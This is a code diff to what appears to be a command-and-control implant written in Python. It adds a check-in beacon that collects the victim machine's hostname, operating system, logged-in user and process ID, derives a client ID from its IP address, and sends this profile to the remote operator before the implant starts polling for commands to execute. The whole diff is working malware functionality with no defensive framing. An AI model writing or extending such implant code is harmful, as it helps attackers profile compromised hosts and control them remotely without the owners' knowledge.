@@ -10,8 +10,12 @@ Usage:
 
 import argparse
 import json
+import os
+import platform
 import random
+import socket
 import time
+import zlib
 from pathlib import Path
 
 from . import protocol as proto
@@ -53,9 +57,40 @@ class Implant:
         self.jitter = jitter
         self.processed_seqs = set()
 
+    def _get_client_id(self) -> str:
+        """Generate a client ID from Adler32 hash of primary IP."""
+        try:
+            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+            s.connect(("8.8.8.8", 80))
+            ip = s.getsockname()[0]
+            s.close()
+        except Exception:
+            ip = "127.0.0.1"
+        return format(zlib.adler32(ip.encode()) & 0xFFFFFFFF, '08x')
+
+    def _send_checkin(self):
+        """Send a check-in beacon so the operator knows we connected."""
+        client_id = self._get_client_id()
+        checkin_data = {
+            "client_id": client_id,
+            "ip_hash": client_id,
+            "hostname": socket.gethostname(),
+            "os": platform.platform(),
+            "user": os.getlogin() if hasattr(os, 'getlogin') else "unknown",
+            "pid": os.getpid(),
+        }
+        result = proto.C2Message(
+            module="checkin", seq=0,
+            status="ok",
+            data=json.dumps(checkin_data),
+        )
+        self._send_result(result)
+        print(f"[*] Check-in sent (client_id={client_id})")
+
     def run(self):
         """Main polling loop. Runs until KeyboardInterrupt."""
         print("[*] Implant started, polling for commands...")
+        self._send_checkin()
         try:
             while True:
                 self._poll_and_execute()
